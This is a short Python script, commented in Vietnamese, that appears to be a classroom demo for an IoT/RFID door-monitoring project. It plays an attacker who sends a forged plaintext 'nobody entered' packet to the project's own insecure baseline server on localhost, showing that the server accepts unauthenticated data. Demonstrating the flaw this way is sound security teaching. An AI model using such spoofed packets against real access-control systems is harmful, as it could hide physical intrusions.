#!/usr/bin/env python3
"""Luồng 2 — Kẻ xấu gửi thẳng gói tin PLAINTEXT giả mạo (không mã hoá/ký/toàn vẹn).

CHỈ dùng để demo lỗ hổng khi Cloud Server chạy ở --baseline (xem cloud_server/server.py).
Không cần khoá, không cần biết bất kỳ bí mật nào — đúng như một kẻ tấn công thực sự.

Cách dùng:
    # Cửa sổ 1: chạy server ở chế độ KHÔNG bảo mật (chỉ để đối chứng)
    python cloud_server/server.py --baseline

    # Cửa sổ 2: kẻ xấu lén qua cửa, gửi gói tin giả "khong co ai"
    python attacker_sim/baseline_fake_packet.py
"""

from __future__ import annotations

import argparse
import json
import socket


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=9000)
    parser.add_argument("--device-id", default="attacker-laptop",
                         help="device_id tuy y - server baseline khong kiem tra")
    args = parser.parse_args()

    fake_payload = {"status": "Khong co ai ra vao", "rfid": "None"}

    with socket.create_connection((args.host, args.port), timeout=5.0) as sock:
        sock.sendall((json.dumps({"type": "HELLO", "device_id": args.device_id}) + "\n").encode())
        print("HELLO ->", sock.recv(4096).decode().strip())

        sock.sendall((json.dumps(fake_payload, ensure_ascii=False) + "\n").encode())
        print("Da gui goi tin gia mao (plaintext):", fake_payload)

        print("Phan hoi Server ->", sock.recv(4096).decode().strip())
        print("\n[KET QUA] Neu Server o che do --baseline: du lieu gia duoc CHAP NHAN "
              "ma khong co canh bao nao -> minh chung lo hong khi thieu bao mat.")


if __name__ == "__main__":
    main()
